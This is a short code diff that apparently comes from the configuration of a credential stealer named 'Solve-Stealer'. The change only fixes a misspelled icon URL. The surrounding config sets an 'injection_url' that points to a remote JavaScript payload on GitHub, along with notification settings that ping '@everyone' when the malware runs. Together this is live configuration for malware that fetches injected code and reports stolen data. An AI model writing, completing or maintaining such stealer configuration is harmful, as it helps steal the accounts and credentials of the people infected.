@@ -12,7 +12,7 @@ const config = {
   ping_on_run: true, 
   ping_val: '@everyone',
   embed_name: 'Solve Injection', 
-  embed_icon: 'https://raw.githubusercontent.com/internalvpn/Sovle-Stealer/main/imgs/solve.jpg'.replace(/ /g, '%20'), 
+  embed_icon: 'https://raw.githubusercontent.com/internalvpn/Solve-Stealer/main/imgs/solve.jpg'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
   injection_url: 'https://raw.githubusercontent.com/internalvpn/injection/main/index.js', 
   /**
